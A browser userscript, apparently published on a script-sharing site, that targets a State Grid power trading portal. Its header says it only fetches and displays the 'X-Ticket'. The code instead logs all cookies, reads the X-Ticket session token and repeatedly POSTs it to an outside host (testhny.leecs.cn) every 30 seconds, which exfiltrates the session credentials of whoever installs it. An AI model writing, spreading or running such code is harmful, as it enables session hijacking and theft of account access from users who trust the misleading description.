// ==UserScript==
// @name         电力ticket获取
// @namespace    http://tampermonkey.net/
// @version      0.3
// @description  自动获取 X-Ticket 并显示
// @author       You
// @match        https://pmos.sn.sgcc.com.cn/*
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @grant        none
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/532301/%E7%94%B5%E5%8A%9Bticket%E8%8E%B7%E5%8F%96.user.js
// @updateURL https://update.greasyfork.org/scripts/532301/%E7%94%B5%E5%8A%9Bticket%E8%8E%B7%E5%8F%96.meta.js
// ==/UserScript==

(function() {
    'use strict';

    function getCookieValue(name) {

        const cookies = document.cookie.split('; ');
        console.log("Cookies:", document.cookie);  // 打印所有 cookies，看看 X-Ticket 是否存在
        for (const cookie of cookies) {
            const [key, value] = cookie.split('=');
            console.log(`检测 Cookie: ${key}=${value}`);  // 逐个打印
            if (key === name) {
                return value;
            }
        }
        return null;
    }

    function showTicket() {
        const xTicket = getCookieValue('X-Ticket');
        if (xTicket) {
            console.log(`X-Ticket: ${xTicket}`);  // ✅ 修正字符串模板错误
//我想在这里把这个X-Ticket通过http的方式发送给三方api
             sendTicketToAPI(xTicket);  // 发送到 API
        } else {
            console.warn('X-Ticket 不存在，可能是 HttpOnly 或 SameSite 限制');
        }
    }




    function sendTicketToAPI(ticket) {
    fetch('https://testhny.leecs.cn/openapi/app/index/getData', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ 'ticket': ticket })
    })
    .then(response => response.json())
    .then(data => console.log('API 响应:', data))
    .catch(error => console.error('发送失败:', error));
}
         // 直接执行
    setTimeout(showTicket, 2000);  // 延迟 2 秒，确保 Cookie 已经加载
    // 每 30 秒执行一次
    setInterval(showTicket, 30000);
})();
